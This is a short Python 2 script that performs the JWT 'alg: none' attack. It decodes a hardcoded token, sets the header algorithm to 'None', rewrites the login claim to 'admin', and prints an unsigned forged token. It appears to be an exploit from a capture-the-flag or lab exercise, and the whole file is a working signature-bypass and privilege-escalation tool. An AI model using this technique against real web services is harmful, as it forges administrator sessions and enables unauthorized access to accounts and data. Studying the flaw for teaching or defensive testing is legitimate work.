#!/usr/bin/env python

import base64
import json
import sys

jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6ImNkbWluIiwiaWF0IjoiMTUzMzA1NTk1NCJ9.NDA1OTE3OThlNGZiMGE1MzRjYTc4NzEyZWRiODU2NmZiMGNhMzc2ZGMyNzE1MDEzYjExNzUzNGNmZTc1Yzk2Yw"

if jwt.count(".") != 2:
  sys.exit("Error: JWT must have exactly 2 dots")


header_encoded, payload_encoded, signature_encoded = jwt.split(".")

header = base64.urlsafe_b64decode(header_encoded + "===")
payload = base64.urlsafe_b64decode(payload_encoded + "===")
signature = base64.urlsafe_b64decode(signature_encoded + "===")

header_dict = json.loads(header)

if not header_dict.has_key("alg"):
  sys.exit("Error: Header was missing an alg value")


header_dict["alg"] = "None"
header_modified = json.dumps(header_dict)
header_modified_encoded = base64.urlsafe_b64encode(header_modified).split("=")[0]

payload_dict = json.loads(payload)

if not payload_dict.has_key("login"):
  sys.exit("Error: Payload is missing a login value")


payload_dict["login"] = "admin"
payload_modified = json.dumps(payload_dict)
payload_modified_encoded = base64.urlsafe_b64encode(payload_modified).split("=")[0]

print header_modified_encoded + "." + payload_modified_encoded + "."
